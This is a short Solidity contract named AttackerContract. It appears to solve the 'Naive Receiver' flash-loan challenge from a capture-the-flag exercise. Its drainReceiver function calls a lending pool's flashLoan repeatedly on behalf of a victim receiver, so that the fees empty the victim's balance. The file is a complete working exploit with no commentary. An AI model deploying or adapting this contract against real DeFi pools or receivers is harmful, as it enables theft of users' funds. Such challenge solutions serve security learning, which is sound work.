// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface NaiveReceiverLender {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerContract {
    address pool;
    constructor (address poolAddress){
        pool = poolAddress;
    }

    function drainReceiver(address payable receiver) public {
        while(receiver.balance > 0) {
            NaiveReceiverLender(pool).flashLoan(receiver, 0);
        }
    }
}